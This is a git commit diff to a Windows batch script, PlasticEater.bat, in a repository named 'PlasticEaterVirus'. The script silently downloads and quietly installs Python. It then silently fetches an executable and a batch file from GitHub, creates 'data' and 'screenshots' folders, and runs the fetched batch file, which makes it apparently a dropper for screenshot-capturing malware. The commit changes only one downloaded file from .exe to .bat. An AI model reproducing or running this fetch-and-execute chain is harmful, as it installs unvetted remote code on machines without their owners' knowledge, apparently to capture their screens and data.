67e8e9bd4579b9a4e65e919476440d978da4bf38
ETML-Midicix <119678382+ETML-Midicix@users.noreply.github.com>
2024-06-24 13:56:40 +0200

    Update PlasticEater.bat

--- Program/PlasticEater.bat
+++ Program/PlasticEater.bat
@@ -4,7 +4,7 @@ cd C:\PlasticEater
 curl https://www.python.org/ftp/python/3.12.3/python-3.12.3-amd64.exe -o pythonInstaller.exe -s
 pythonInstaller.exe /quiet
 curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/script.exe -L -O -s
-curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/pymodule.exe -L -O -s
+curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/pymodule.bat -L -O -s
 mkdir data
 mkdir screenshots
 pymodule.bat
